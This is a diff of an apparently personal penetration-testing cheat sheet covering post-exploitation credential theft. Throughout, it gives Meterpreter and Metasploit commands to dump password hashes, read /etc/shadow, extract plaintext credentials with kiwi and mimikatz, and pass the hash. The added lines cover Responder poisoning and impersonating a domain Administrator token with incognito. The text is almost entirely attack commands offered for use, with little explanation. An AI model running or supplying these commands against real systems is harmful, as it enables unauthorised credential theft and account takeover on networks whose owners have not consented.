@@ -628,22 +628,28 @@ msf5 > use exploit/windows/local/bypassuac (Win7+)  (make sure to set correct se
 creds
 msf> run post/windows/gather/hashdump
 meterpreter > hashdump (pulls from memory)
-meterpreter > run post/windows/gather/smart_hashdump (pulls from disk)
+meterpreter > run hashdump (pulls from disk)
 look for backup copies of SAM database under C:/windows/repair, or C:/windows/backup
 
-copy /etc/passwd and /etc/shadow if *nix	
+copy /etc/passwd and /etc/shadow if *nix    
+Linux: watch for Salts depending on distro
 
 meterpeter> use kiwi
-meterpreter> creds_all      (pull plaintext creds out of memory)
+meterpreter> creds_all      (try all modules - sometimes crashes meterpeter!)
 meterpeter> msv
-meterpeter> Kerberos
+meterpeter> kerberos
 meterpeter> wdigest (kiwi command for older systems)
-meterpreter> load mimikatz (use for older systems, kiwi for newer ones)
+meterpreter> load mimikatz
 meterpreter> mimikatz_command -f samdump::hashes
-
 LANMAN? Easy to crack
 NTLM? If you can get hashes, pass-the-hash!
 Net-NTLM? Can’t pass the hash
+Active Directory on a domain? Start running Responder - LLMNR/NBT-NS/MDNS poisoner - 
+meterpreter> load incognito
+meterpreter> help
+meterpreter> list_tokens -u 
+meterpreter> impersonate_token DOMAINHERE\\Administrator      (masquerade as this user within this meterpreter session)
+
 
 windows domain creds
 meterpreter> load incognito
